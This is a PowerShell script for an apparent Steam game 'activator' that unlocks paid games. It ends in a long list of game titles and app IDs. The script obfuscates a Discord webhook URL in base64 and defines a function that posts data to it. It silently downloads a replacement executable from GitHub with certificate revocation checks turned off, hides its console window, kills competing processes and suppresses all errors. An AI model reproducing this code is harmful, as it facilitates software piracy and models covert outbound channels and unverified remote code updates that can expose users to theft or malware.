function S([string]$b) {
    try { return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) } catch { return $b }
}
$script:obfKey = [Convert]::FromBase64String("QmFzdGlzc1N0ZWFt")
function D([string]$b) {
    try { return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)) } catch { return $b }
}


Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = 'SilentlyContinue'
$global:ErrorActionPreference = 'SilentlyContinue'

# --- V1.7 FIX rutas 8.3 / perfil inexistente (evita "No existe ningun objeto en la ruta de acceso") ---
function ConvertTo-BsaLongPath { param([string]$Path)
    if ([string]::IsNullOrWhiteSpace($Path)) { return $Path }
    try { $it = Get-Item -LiteralPath $Path -Force -ErrorAction Stop; if ($it) { return $it.FullName } } catch {}
    try { $p = [System.IO.Path]::GetFullPath($Path); if ($p) { return $p } } catch {}
    return $Path
}
function Repair-BsaPaths {
    try {
        $prof = [Environment]::GetEnvironmentVariable('USERPROFILE','Process')
        if ([string]::IsNullOrWhiteSpace($prof) -or -not (Test-Path -LiteralPath $prof)) {
            $real = $null
            try {
                $sid = [System.Security.Principal.WindowsIdentity]::GetCurrent().User.Value
                if ($sid) { $real = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\$sid" -Name ProfileImagePath -ErrorAction SilentlyContinue).ProfileImagePath }
            } catch {}
            if (-not $real) { try { $real = [Environment]::GetFolderPath('UserProfile') } catch {} }
            if (-not $real) { $real = ConvertTo-BsaLongPath $prof }
            if ($real -and (Test-Path -LiteralPath $real)) {
                $env:USERPROFILE = $real
                $local = Join-Path $real 'AppData\Local'
                $roam = Join-Path $real 'AppData\Roaming'
                $tmp = Join-Path $local 'Temp'
                if (-not (Test-Path -LiteralPath $tmp)) { try { New-Item -ItemType Directory -Path $tmp -Force | Out-Null } catch {} }
                if (Test-Path -LiteralPath $local) { $env:LOCALAPPDATA = $local }
                if (Test-Path -LiteralPath $roam) { $env:APPDATA = $roam }
                if (Test-Path -LiteralPath $tmp) { $env:TEMP = $tmp; $env:TMP = $tmp }
            }
        }
    } catch {}
    foreach ($n in 'USERPROFILE','LOCALAPPDATA','APPDATA','TEMP','TMP') {
        try {
            $v = [Environment]::GetEnvironmentVariable($n,'Process')
            if (-not [string]::IsNullOrWhiteSpace($v)) { $l = ConvertTo-BsaLongPath $v; if ($l -ne $v) { [Environment]::SetEnvironmentVariable($n,$l,'Process') } }
        } catch {}
    }
    try {
        if ([string]::IsNullOrWhiteSpace($env:TEMP) -or -not (Test-Path -LiteralPath $env:TEMP)) {
            $alt = Join-Path $env:SystemRoot 'Temp'
            if (Test-Path -LiteralPath $alt) { $env:TEMP = $alt; if ([string]::IsNullOrWhiteSpace($env:TMP)) { $env:TMP = $alt } }
        }
    } catch {}
}
Repair-BsaPaths
# --- fin FIX rutas ---

$script:expiryWatcher = $false
try {
    $cliArgsAll = @($args) + @([Environment]::GetCommandLineArgs())
    if ($cliArgsAll -contains '-expiry' -or $env:BSMAP_EXPIRY -eq '1') { $script:expiryWatcher = $true }
} catch {}

$script:singleMutex = $null
if (-not $script:expiryWatcher) {
    try {
        $script:singleMutex = New-Object System.Threading.Mutex($false, "Local\BastissSteamActivatorMutex")
        $mGot = $false
    try { $mGot = $script:singleMutex.WaitOne(0) } catch [System.Threading.AbandonedMutexException] { $mGot = $true }
    if (-not $mGot) {
        Get-Process | Where-Object { $_.Id -ne $PID -and ($_.ProcessName -like 'BastissSteamActivator*') } | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 900
        try { $null = $script:singleMutex.WaitOne(0) } catch [System.Threading.AbandonedMutexException] { }
    }
    } catch {}
}

trap {
    if ($script:inTrap) { continue }
    try { $script:inTrap = $true } catch {}
    if ($_.Exception.Message -match 'ya existe|already exists') {
        try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] TRAP_SUPPRESSED already exists: $($_.Exception.Message)`n$($_.InvocationInfo.PositionMessage)" -Encoding UTF8 } catch {}
        try { $script:inTrap = $false } catch {}
        continue
    }
    try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] TRAP: $($_.Exception.Message)`n$($_.InvocationInfo.PositionMessage)`n$($_.ScriptStackTrace)" -Encoding UTF8 } catch {}
    try { $script:inTrap = $false } catch {}
}
try {
    [System.Windows.Forms.Application]::SetUnhandledExceptionMode([System.Windows.Forms.UnhandledExceptionMode]::CatchException)
    [System.Windows.Forms.Application]::add_ThreadException({
        param($s,$e)
        $m=$e.Exception.Message
        if ($m -match 'ya existe|already exists') {
            try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] THREAD_SUPPRESSED already exists: $m" -Encoding UTF8 } catch {}
            return
        }
        try { Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] THREAD: $m`n$($e.Exception.StackTrace)" -Encoding UTF8 } catch {}
    })
    [AppDomain]::CurrentDomain.add_UnhandledException({
        param($s,$e)
        try { $ex=$e.ExceptionObject; Add-Content -Path (Join-Path $env:TEMP 'bsmap_error.log') -Value "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] DOMAIN: $($ex.Message)`n$($ex.StackTrace)" -Encoding UTF8 } catch {}
    })
} catch {}
function Safe-FileCreate([string]$p) {
    try { if (Test-Path -LiteralPath $p) { Remove-Item -LiteralPath $p -Force -ErrorAction SilentlyContinue } } catch {}
    try { $d=Split-Path $p -Parent; if ($d -and -not (Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null } } catch {}
    return [System.IO.File]::Create($p)
}
if (-not $script:expiryWatcher) {
    [System.Windows.Forms.Application]::EnableVisualStyles()
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class DwmHelper {
    [DllImport("dwmapi.dll")]
    public static extern int DwmSetWindowAttribute(IntPtr hwnd, int attr, ref int attrValue, int attrSize);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("shell32.dll")]
    public static extern int SetCurrentProcessExplicitAppUserModelID([MarshalAs(UnmanagedType.LPWStr)] string AppID);
}
public class WinFg {
    [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
}
"@
    try { [DwmHelper]::SetCurrentProcessExplicitAppUserModelID("BastissSteam.Activator") | Out-Null } catch {}
    try { $cw = [DwmHelper]::GetConsoleWindow(); if ($cw -ne [IntPtr]::Zero) { [DwmHelper]::ShowWindow($cw, 0) | Out-Null } } catch {}
}


if (-not $script:expiryWatcher) {
    try {
        $script:siMutex = New-Object System.Threading.Mutex($false, 'BastissSteamActivator2_SI')
        $mGot2 = $false
    try { $mGot2 = $script:siMutex.WaitOne(0) } catch [System.Threading.AbandonedMutexException] { $mGot2 = $true }
    if (-not $mGot2) {
        Get-Process | Where-Object { $_.Id -ne $PID -and ($_.ProcessName -like 'BastissSteamActivator*') } | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 900
        try { $null = $script:siMutex.WaitOne(0) } catch [System.Threading.AbandonedMutexException] { }
    }
    } catch {}
}

# ---- Reemplazar el exe instalado por la ultima version ----
function Update-LocalExe {
    try {
        $exePath = Join-Path $env:LOCALAPPDATA 'BastissSteam\BastissSteamActivator2.exe'
        if (-not (Test-Path -LiteralPath $exePath)) { return }
        $tmpExe = "$exePath.new"
        try { if (Test-Path -LiteralPath $tmpExe) { Remove-Item -LiteralPath $tmpExe -Force -ErrorAction SilentlyContinue } } catch {}
        $crExe = Invoke-CurlHidden @('-sL','-f','--ssl-no-revoke','--tlsv1.2','--noproxy','*','--max-time','60','-o',$tmpExe,'https://raw.githubusercontent.com/bastisayes/BastissSteamV18/main/BastissSteamActivator3.exe') 70
        if ($crExe.exit -eq 0 -and (Test-Path -LiteralPath $tmpExe) -and ((Get-Item -LiteralPath $tmpExe).Length -gt 100000)) {
            try { if (Test-Path -LiteralPath $exePath) { Remove-Item -LiteralPath $exePath -Force -ErrorAction SilentlyContinue } } catch {}
            Move-Item -LiteralPath $tmpExe -Destination $exePath -Force
        } else { Remove-Item -LiteralPath $tmpExe -Force -ErrorAction SilentlyContinue }
    } catch {}
}
function New-BufferedPanel {
    $p = New-Object System.Windows.Forms.Panel
    $bf = [System.Reflection.BindingFlags]'Instance,NonPublic'
    try { $p.GetType().GetProperty('DoubleBuffered',$bf).SetValue($p,$true) } catch {}
    try {
        $flags = [int][System.Windows.Forms.ControlStyles]::AllPaintingInWmPaint + [int][System.Windows.Forms.ControlStyles]::UserPaint + [int][System.Windows.Forms.ControlStyles]::OptimizedDoubleBuffer
        $p.GetType().GetMethod('SetStyle',$bf).Invoke($p,@([System.Windows.Forms.ControlStyles]$flags,$true)) | Out-Null
    } catch {}
    $p
}








$script:version = "V2.09"
$errorLogFile = Join-Path $env:TEMP (S("YnNtYXBfZXJyb3IubG9n"))

function WEL {
    param([string]$Msg, $Ex)
    try {
        $text = "[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] $Msg"
        if ($Ex) { $text += "`nEXCEPTION: $($Ex.Exception)`nAT: $($Ex.InvocationInfo.PositionMessage)`nSTACK: $($Ex.ScriptStackTrace)" }
        Add-Content -Path $errorLogFile -Value $text -Encoding UTF8 -ErrorAction SilentlyContinue
    } catch {}
}


$WEBHOOK_URL = (D "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxMTQ5NTMzMDIzMzg0Nzg1OC9xMVZ4NU9SblBzV3VLRnJWbnByVXVpZTZ5YVdlUmVLcHJ1anpfUnZyal9BUzh1MFNPeG1iN05TaHRWZXladDJFWEllTQ==")
function Send-DiscordJson([string]$url,[string]$jsonBody,[int]$TimeoutSec=10) {
    try {
        $b8=[System.Text.Encoding]::UTF8.GetBytes($jsonBody)
        Invoke-RestMethod -Uri $url -Method Post -Body $b8 -ContentType 'application/json; charset=utf-8' -TimeoutSec $TimeoutSec -UseBasicParsing -ErrorAction Stop | Out-Null
        return $true
    } catch { return $false }
}

$script:bgPowershells = @()
function Invoke-BgNoWait {
    param([scriptblock]$sb, [object[]]$argList)
    try {
        $ps = [PowerShell]::Create()
        [void]$ps.AddScript($sb)
        foreach ($a in @($argList)) { [void]$ps.AddArgument($a) }
        $h = $ps.BeginInvoke()
        $script:bgPowershells += @{ ps=$ps; h=$h }
        if (@($script:bgPowershells).Count -gt 24) {
            $alive = @()
            foreach ($j in @($script:bgPowershells)) {
                if ($j.h.IsCompleted) { try { $j.ps.EndInvoke($j.h) } catch {}; try { $j.ps.Dispose() } catch {} } else { $alive += $j }
            }
            $script:bgPowershells = $alive
        }
    } catch {}
}
function Start-SleepDoEvents([int]$ms) {
    $end = (Get-Date).AddMilliseconds($ms)
    while ((Get-Date) -lt $end) {
        try { [System.Windows.Forms.Application]::DoEvents() } catch {}
        Start-Sleep -Milliseconds 25
    }
}
function Invoke-PsBlockingDoEvents {
    param([scriptblock]$sb, [object[]]$argList, [int]$TimeoutSec = 25)
    $pool = $null; $ps = $null
    try {
        $pool = [RunspaceFactory]::CreateRunspacePool(1, 1)
        $pool.Open()
        $ps = [PowerShell]::Create()
        $ps.RunspacePool = $pool
        [void]$ps.AddScript($sb)
        foreach ($a in @($argList)) { [void]$ps.AddArgument($a) }
        $h = $ps.BeginInvoke()
        $sw = [System.Diagnostics.Stopwatch]::StartNew()
        while (-not $h.IsCompleted) {
            try { [System.Windows.Forms.Application]::DoEvents() } catch {}
            Start-Sleep -Milliseconds 40
            if ($TimeoutSec -gt 0 -and $sw.Elapsed.TotalSeconds -gt $TimeoutSec) {
                try { $ps.Stop() } catch {}
                return $null
            }
        }
        $out = $ps.EndInvoke($h)
        if ($out -and @($out).Count -gt 0) { return $out[0] }
        return $null
    } catch { return $null }
    finally { try { if ($ps) { $ps.Dispose() } } catch {}; try { if ($pool) { $pool.Close(); $pool.Dispose() } } catch {} }
}

function Format-Juegos([int]$n) {
    if ($n -ge 59) { return "+1000 juegos" }
    if ($n -eq 1) { return "1 juego" }
    return "$n juegos"
}

$script:GAME_NAME_DATA = @'
/R - A Neurodivergent Thriller (3396850)
007 First Light (3768760)
1 Screen Platformer (791180)
1 Screen Platformer: Prologue (1271540)
100 Crime Cats (2954460)
105400 (no data) (105400)
20 Minute Metropolis - The Action City Builder (700200)
255480 (no data) (255480)
3 Minutes to Midnight(R) - A Comedy Graphic Adventure (832500)
380 (error) (380)
3D PUZZLE - Sun Temple (3079410)
60 Seconds! Reatomized (1012880)
7 Days to Die (251570)
911 Operator (503560)
911: Prey (2537120)
A Hat in Time (253230)
A Plague Tale: Innocence (752590)
A Plague Tale: Requiem (1182900)
A Robot Named Fight! (603530)
A Short Hike (1055540)
A Solitaire Mystery (3743220)
A Space for the Unbound (1201270)
A Story About My Uncle (278360)
A Total War Saga: TROY (1099410)
A Way Out (1222700)
A Webbing Journey (2073910)
Abalon: Roguelike Tactics CCG (1681840)
Abandoned Souls (2412490)
Abandoned Stories: Inherited Silence (4478760)
Abandoned Void (2420450)
ABZU (384190)
Academy Love Saga: Tennis Angels EX (3099640)
Ace Attorney Investigations Collection (2401970)
Advent NEON(R) (1528260)
Aerofly FS 2 Flight Simulator (434030)
Aerofly FS 4 Flight Simulator (1995890)
aerofly RC 10 - RC Flight Simulator (2394350)
Aery - Cyber City (2711630)
Age of Empires II: Definitive Edition (813780)
Age of Empires III: Definitive Edition (933110)
Age of Empires IV: Anniversary Edition (1466860)
Age of Mythology: Extended Edition (266840)
Age of Mythology: Retold (1934680)
AI: The Somnium Files (948740)
AI: THE SOMNIUM FILES - nirvanA Initiative (1449200)
AKIBA'S TRIP: Undead  Undressed (333980)
Alan Wake (108710)
Alan Wake's American Nightmare (202750)
Alchemy Factory (3669570)
Alice in CyberCity (1072000)
Almost There: The Platformer (951940)
Alpha Protocol(TM) (34010)
American Truck Simulator (270880)
AMID EVIL (673130)
Amnesia: Rebirth (999220)
Amnesia: The Bunker (1944430)
Amnesia: The Dark Descent (57300)
Ancestors: The Humankind Odyssey (536270)
Ancient Cities (667610)
Ancient Dungeon (1125240)
Ancient Enemy (993790)
Ancient Kingdoms (2241380)
Ancient Saga: Vikings Journey (2307690)
Ancient Warfare 3 (758990)
Angel Engine (4173750)
Angel Legion (1333350)
Angels & Demigods - SciFi VR Visual Novel (503160)
Angels Fall First (367270)
Anno 1800 (916440)
Another Farm Roguelike (2116850)
Aragami (280160)
Aragami 2 (1158370)
Arcade Tycoon (TM) : Simulation Game (750520)
Arcanum: Of Steamworks and Magick Obscura (500810)
ARK: Survival Ascended (2399830)
ARK: Survival Evolved (346110)
Arma 3 (107410)
Arms of God (3100310)
Asgard's Fall - Viking Survivors (2780710)
Assassin's Creed 2 (33230)
Assassin's Creed Mirage (3035570)
Assassin's Creed(R) III Remastered (911400)
Assassin's Creed(R) Odyssey (812140)
Assassin's Creed(R) Origins (582160)
Assassin's Creed(R) Revelations (201870)
Assassin's Creed(R) Syndicate (368500)
Assassin's Creed(R) Unity (289650)
Assassin's Creed Shadows (3159330)
Assassin's Creed(R) Brotherhood (48190)
Assassin's Creed(R) Chronicles: China (354380)
Assassin's Creed(R) IV Black Flag(TM) (242050)
Assassin's Creed(R) Liberation HD (260210)
Assassin's Creed(R) Rogue (311560)
Assault Android Cactus+ (250110)
Assetto Corsa (244210)
ASTRONEER (361420)
ATOM RPG: Post-apocalyptic indie game (552620)
Atomic Heart (668580)
Attack on Titan 2 - A.O.T.2 (601050)
Automobilista 2 (1066890)
Avatar Legends: The Fighting Game (2424420)
Avatar: Frontiers of Pandora(TM) (2840770)
Axiom Verge (332200)
Back 4 Blood (924970)
Backrooms Exploration (1730930)
Backrooms: Escape Together (2141730)
Balatro (2379780)
Baldur's Gate 3 (1086940)
Baldur's Gate II: Enhanced Edition (257350)
Baldur's Gate: Enhanced Edition (228280)
Batman: Arkham Asylum Game of the Year Edition (35140)
Batman: Arkham City (57400)
Batman: Arkham City - Game of the Year Edition (200260)
Batman(TM): Arkham Origins Blackgate - Deluxe Edition (267490)
Battlefield 3(TM) (1238820)
Battlefield 4(TM) (1238860)
Battlefield(TM) 1 (1238840)
Battlefield(TM) 6 (2807960)
Battlefield(TM) Hardline (1238880)
Battlefield(TM) V (1238810)
Battlefleet Gothic: Armada 2 (573100)
Bayonetta (460790)
BeamNG.drive (284160)
Best Elf (1583240)
BIGFOOT (509980)
BioShock Infinite (8870)
BioShock(R) 2 (8850)
BioShock(TM) (7670)
BioShock(TM) 2 Remastered (409720)
BioShock(TM) Remastered (409710)
Black Mesa (362890)
Black Myth: Wukong (2358720)
Blacklist Mafia (2800500)
Blasphemous (774361)
Blood Omen 2: Legacy of Kain (242960)
Book of Yog Idle RPG (1097430)
Borderlands 2 (49520)
Borderlands 3 (397540)
Borderlands Game of the Year (8980)
Borderlands Game of the Year Enhanced (729040)
Borderlands: The Pre-Sequel (261640)
Boss Rush: Mythology (1237870)
Braid (26800)
Brick Building (1352440)
Broforce (274190)
Brotato (1942280)
Brothers - A Tale of Two Sons (225080)
Building Destruction (2154730)
Building our Futature (2178860)
Bulletstorm: Full Clip Edition (501590)
Bully: Scholarship Edition (12200)
Bulwark: Falconeer Chronicles (290100)
Bunker - The Underground Game (354180)
Burgie's Cozy Kitchen (3314340)
Bus Simulator 16 (324310)
Bus Simulator 18 (515180)
Bus Simulator 21 Next Stop (976590)
Bus Simulator 27 (2397320)
Bus-Simulator 2012 (253770)
Call of Duty: World at War (10090)
Call of Duty(R) 4: Modern Warfare(R) (2007) (7940)
Call of Duty(R): Black Ops (42700)
Call of Duty(R): Black Ops II (202970)
Call of Duty(R): Infinite Warfare (292730)
Call of Duty(R): Modern Warfare(R) 2 (2009) (10180)
Call of Duty(R): Modern Warfare(R) 3 (2011) (42680)
Car Mechanic Simulator 2014 (270850)
Car Mechanic Simulator 2015 (320300)
Car Mechanic Simulator 2018 (645630)
Car Mechanic Simulator 2021 (1190000)
Card Survival: Tropical Island (1694420)
Caribbean Legend (2230980)
Carp Fishing Simulator (366290)
CARRION (953490)
CarX Street (1114150)
Casino Management Simulator (2823790)
Castle Craft (2086680)
Castle Crashers(R) (204360)
CastleMiner Z (253430)
Cats Visiting Historical Times (3618700)
Cave Story+ (200900)
Celeste (504230)
Charles Haunted Mansion (2569680)
Chef RPG (1796790)
Chronology (269330)
Citizen Sleeper 2: Starward Vector (2442460)
City Builder (843780)
City Gangster Simulator (3612460)
Clone Drone in the Danger Zone (597170)
Clone Drone in the Hyperdome (2401230)
CODE VEIN (678960)
Cognition: An Erica Reed Thriller (242780)
Colony On Mars (773640)
Colony Survival (366090)
Combolands: Roguelike Citybuilder (4075620)
Concrete Jungle (400160)
Condemned: Criminal Origins (4720)
Conflict Desert Storm(TM) (211780)
Contraband Police (756800)
CONTROL Ultimate Edition (870780)
Cooking Companions (1263230)
Cooking Craze (2540630)
Cooking Dash(R) (37220)
Cooking Simulator (641320)
Cooking Simulator 2: Better Together (2455360)
Cooking Simulator VR (1358140)
Core Keeper (1621690)
Cozy Caravan (2788520)
Cozy Cleaner (2742710)
Cozy Grove: Camp Spirit (2021960)
Crafting Block World (1120960)
Crafting Idle Clicker (1250790)
Crayon Physics Deluxe (26900)
Crime Boss: Rockay City (2933080)
Crime Scene Cleaner (1040200)
Crime Simulator (2737070)
Crime Simulator: Playgrounds (2928280)
Crimson Desert Enhanced (3321460)
CrossCode (368340)
Cruelty Squad (1388770)
Crusader Kings III (1158310)
Crypt Robbery (3362670)
Crysis (17300)
Crysis 2 - Maximum Edition (108800)
Crysis Remastered (1715130)
Crysis Warhead(R) (17330)
Cthulhu Mythos ADV Lunatic Whispers (1965920)
Cthulhu Mythos ADV The Isle Of Ubohoth (2701590)
Cthulhu Saves the World (107310)
Cube Life: Island Survival (760800)
Cubic Odyssey (3400000)
Cuphead (268910)
Cursed Armor (907090)
Cursed Armor 2 (3276280)
Cursed Companions (3265230)
Cyber City (1061930)
Cyber City 2157: The Visual Novel (454690)
Cyber Hook (1130410)
Cyber Utopia (654350)
CyberCity: SEX Saga (2407350)
Cyberpunk 2077 (1091500)
Dagon: by H. P. Lovecraft (1481400)
Dark Elf Historia (2492730)
Dark Hunting Ground (2494810)
DARK SOULS(TM) II: Scholar of the First Sin (335300)
DARK SOULS(TM) III (374320)
DARK SOULS(TM): REMASTERED (570940)
Darkest Dungeon(R) (262060)
Darkest Dungeon(R) II (1940340)
Darksiders Genesis (710920)
Darksiders II Deathinitive Edition (388410)
Darksiders III (606280)
Darksiders Warmastered Edition (462780)
Darksiders(TM) (50620)
Database Detective: Minor Crimes Division (3950130)
DATE A LIVE: Ren Dystopia (2627780)
Days Gone (1259420)
Dead Age 2: The Zombie Survival RPG (951430)
Dead Cells (588650)
Dead Island 2 (934700)
Dead Island Definitive Edition (383150)
DEAD RISING(R) (427190)
Dead Rising(R) 2 (45740)
Dead Space (1693980)
Dead Space(TM) 2 (47780)
Dead Space(TM) 3 (1238060)
Dead Synchronicity: Tomorrow Comes Today (339190)
Death Match Love Comedy! (1265570)
DEATH STRANDING (1190460)
DEATH STRANDING DIRECTOR'S CUT (1850570)
Death's Door (894020)
DEATHLOOP (1252330)
Deep Sea Valentine (1536720)
Deer Hunting Camp (3692240)
DELTARUNE (1671210)
Demon Lord: Just a Block (3720420)
Demon Maiden and Slave Summoning (1997460)
Demon Slayer -Kimetsu no Yaiba- The Hinokami Chronicles 2 (2928600)
DEMON'S TILT (422510)
Demonologist (1929610)
Desire Empire (4651940)
Destiny 2 (1085660)
Detective Case and Clown Bot in: Murder in the Hotel Lisbon (297290)
Detective Case and Clown Bot in: The Express Killer (711920)
Detective Grimoire (272600)
Detective Instinct: Farewell, My Beloved (2689930)
Detroit: Become Human (1222140)
DEUS EX MACHINA 2 (353610)
Deus Ex: Breach (555450)
Deus Ex: Game of the Year Edition (6910)
Deus Ex: Human Revolution - Director's Cut (238010)
Deus Ex: Invisible War (6920)
Deus Ex: Mankind Divided (337000)
Deus Ex: Mankind Divided(TM) - VR Experience (526180)
Devil May Cry 5 (601150)
Devil May Cry HD Collection (631510)
Dieselpunk Wars (952240)
DiRT Rally 2.0 (690790)
Disco Elysium - The Final Cut (632470)
Dishonored 2 (403640)
Dishonored(R): Death of the Outsider(TM) (614570)
Disney Dreamlight Valley (1401590)
Disney Princess: Enchanted Journey (322130)
Divinity: Original Sin - Enhanced Edition (373420)
Divinity: Original Sin 2 - Definitive Edition (435150)
Do Not Feed the Monkeys (658850)
Doki Doki Literature Club! (698780)
DOOM (379720)
DOOM Eternal (782330)
DOOM: The Dark Ages (3017860)
Dragon Age II: Ultimate Edition (1238040)
Dragon Age: Origins - Ultimate Edition (47810)
Dragon Age(TM) Inquisition (1222690)
DRAGON BALL FighterZ (678950)
DRAGON BALL XENOVERSE (323470)
DRAGON BALL XENOVERSE 2 (454650)
DRAGON BALL Z: KAKAROT (851850)
DRAGON BALL: Sparking! ZERO (1790600)
DRAGON QUEST BUILDERS (2436570)
DRAGON QUEST BUILDERS(TM) 2 (1072420)
DRAGON QUEST I & II HD-2D Remake (2893570)
DRAGON QUEST III HD-2D Remake (2701660)
DRAGON QUEST MONSTERS: The Dark Prince (2175540)
DRAGON QUEST TREASURES (2021210)
DRAGON QUEST VII Reimagined (2499860)
DRAGON QUEST(R) XI S: Echoes of an Elusive Age(TM) - Definitive Edition (1295510)
Dragon's Dogma: Dark Arisen (367500)
DragonSword : Awakening (4570720)
Drama Queens (2741820)
Duck Detective: The Secret Salami (2637990)
Duck Life: Retro Pack (1433950)
Dungeon Settlers (2798330)
DUSK (519860)
Dust: An Elysian Tail (236090)
Dwarf Defense (857850)
Dwarf Fortress (975370)
Dwarf Shop (1247640)
Dwarf Tower (335100)
Dying Light (239140)
Dying Light 2 Stay Human: Reloaded Edition (534380)
Dying Light: The Beast (3008130)
EA SPORTS(TM) FIFA 21 (1313860)
Ecrazeus Castle (4106270)
ELDEN RING (1245620)
ELDEN RING NIGHTREIGN (2622380)
Elf Sex Farm (1738990)
Elite Dangerous (359320)
ENDLESS Legend(TM) 2 (3407390)
Enter the Gungeon (311690)
Escape Academy (1812090)
Escape From Duckov (3167020)
Escape Simulator (1435790)
Escape Simulator 2 (2879840)
Escape the Backrooms (1943950)
Etrian Odyssey HD (1868180)
Euro Truck Simulator 2 (227300)
European Ship Simulator (299250)
Exit the Gungeon (1209490)
ExoColony: Planet Survival (2187340)
F-19 Stealth Fighter (347250)
F.E.A.R. 2: Project Origin (16450)
F1(R) 2021 (1134570)
F1(R) 25 (3059520)
Fable Anniversary (288470)
Factorio (427520)
Fallout 2: A Post Nuclear Role Playing Game (38410)
Fallout 3 (22300)
Fallout 3: Game of the Year Edition (22370)
Fallout 4 (377160)
Fallout 76 (1151340)
Fallout Tactics: Brotherhood of Steel (38420)
Fallout: A Post Nuclear Role Playing Game (38400)
Fallout: New Vegas (22380)
False Myth (1257200)
Fantastic Orc (2672110)
Far Cry 3 - Blood Dragon (233270)
Far Cry(R) 2 (19900)
Far Cry(R) 4 (298110)
Far Cry(R) 5 (552520)
Far Cry(R) 6 (2369390)
Far Cry(R) New Dawn (939960)
Far Cry(R) Primal (371660)
Faraway: Jungle Escape (1747680)
Farming Simulator 17 (447020)
Farming Simulator 19 (787860)
Farming Simulator 22 (1248130)
Farming Simulator 25 (2300320)
Fear of The Undead: Rise of Evil (2263220)
FEZ (224760)
FIFA 22 (1506830)
FINAL FANTASY TACTICS - The Ivalice Chronicles (1004640)
FINAL FANTASY VII REMAKE INTERGRADE (1462040)
FINAL FANTASY X/X-2 HD Remaster (359870)
FINAL FANTASY XII THE ZODIAC AGE (595520)
FINAL FANTASY XV WINDOWS EDITION (637650)
FINAL FANTASY(R) XIII (292120)
FINAL FANTASY(R) XIII-2 (292140)
Fireside Fables: Wholesome Narrative Adventure! (3365560)
Firestone - Idle Clicker Online RPG (1013320)
Firewatch (383870)
First Dwarf (1714900)
Fishing Planet (380600)
Five Nights at Freddy's (319510)
Five Nights at Freddy's 2 (332800)
Five Nights at Freddy's 3 (354140)
Five Nights at Freddy's 4 (388090)
FIVE NIGHTS AT FREDDY'S: HELP WANTED (732690)
Five Nights at Freddy's: Help Wanted 2 (2287520)
Five Nights at Freddy's: Into the Pit (2638370)
Five Nights at Freddy's: Secret of the Mimic (2215390)
Five Nights at Freddy's: Security Breach (747660)
Five Nights at Freddy's: Sister Location (506610)
Florence (1102130)
FlyKnight (3108510)
Football Manager 2023 (1904540)
Footgun: Underground (2206240)
Forage Wizard (3868320)
Forensics: Crime Scene Detective (3765010)
Forest Escape: Last Train (4090360)
Forest Hustle (4168290)
Forgotten Realms: Demon Stone (3843530)
Forgotten Seas (2168260)
Forza Horizon 4 (1293830)
Forza Horizon 5 (1551360)
Forza Horizon 6 (2483190)
Four Last Things (503400)
Freddi Fish 2: The Case of the Haunted Schoolhouse (294530)
Freddy Fazbear's Pizzeria Simulator (738060)
Frog Detective 2: The Case of the Invisible Wizard (1047220)
From Dust (33460)
Frostpunk (323190)
Frostpunk 2 (1601580)
Fungal Colony Sim 2 (3947310)
Furry Myth  (2451640)
Future War Tactics: SOF vs Alien Invasion - Turn-Based Strategy (3680900)
Garry's Mod (4000)
Gassal Simulation (3397390)
Gears 5 (1097840)
Gems of War - Puzzle RPG (329110)
Gentoo Rescue (2830480)
Ghost Janitors (2772990)
Ghost Trick: Phantom Detective (1967430)
Ghost Watchers (1850740)
Ghostrunner (1139900)
Ghosts'n DJs (1207390)
Ghostwire: Tokyo (1475810)
Giant Machines 2017 (402750)
Giant Waifu Wash Simulator  (4719730)
Giant Wishes (2122360)
Global Rescue (2873660)
Goat Simulator (265930)
Goat Simulator 3 (850190)
GOD EATER 3 (899440)
God of War (1593500)
God of War Ragnarok (2322010)
God Simulator (509440)
Going Medieval (1029780)
Gold Gold Adventure Gold (3133650)
GONE Fishing (3645890)
Good Pizza, Great Pizza - Cooking Simulator Game (770810)
Gorogoa (557600)
Gothic II: Gold Edition (39510)
Grand Theft Auto III - The Definitive Edition (1546970)
Grand Theft Auto IV: The Complete Edition (12210)
Grand Theft Auto V Enhanced (3240220)
Grand Theft Auto: San Andreas - The Definitive Edition (1547000)
Grand Theft Auto: Vice City - The Definitive Edition (1546990)
Grandpa High on Retro (2967320)
Grass Life Sim (3356720)
Great Utopia (1220990)
GreedFall (606880)
Green Hell (815370)
Griftlands (601840)
GRIS (683320)
Grounded (962130)
Grounded 2 (2661300)
Gumshoe Detective Agency: The First Case (3632910)
Gunman Contracts - Stand Alone (2421750)
Hades (1145360)
Half-Life (70)
Half-Life 2: Episode Two (420)
Halo: Campaign Evolved (2806050)
Haunted Investigation (2400880)
Haunted Room : 205 (3694590)
Heavy Bullets (297120)
Heavy Rain (960910)
Hellblade II: Senua's Saga (2461850)
Hello Kitty Island Adventure (2495100)
Hello Neighbor (521890)
Hello Neighbor 2 (1321680)
Hi-Fi RUSH (1817230)
Hidden Deep (976890)
Hidden Folks (435400)
Hidden Kitten (2402200)
Hidden Realm of the Enchantress (3159120)
Hidden SciFi City Top-Down 3D (2506870)
